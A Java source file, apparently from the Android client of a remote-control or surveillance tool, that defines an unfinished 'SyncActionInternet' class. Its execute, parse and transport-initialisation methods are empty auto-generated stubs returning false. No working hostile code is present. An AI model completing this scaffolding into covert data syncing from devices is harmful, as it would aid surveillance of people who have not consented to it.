package com.ht.RCSAndroidGUI.action;

import java.util.Vector;

import com.ht.RCSAndroidGUI.action.sync.Protocol;

public class SyncActionInternet extends SyncAction {

    protected Vector transports;
    protected Protocol protocol;

    protected boolean initialized;
    
	public SyncActionInternet(int type, byte[] confParams) {
		super(type, confParams);
	}

	@Override
	public boolean execute() {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(byte[] confParams) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean initTransport() {
		// TODO Auto-generated method stub
		return false;
	}

}
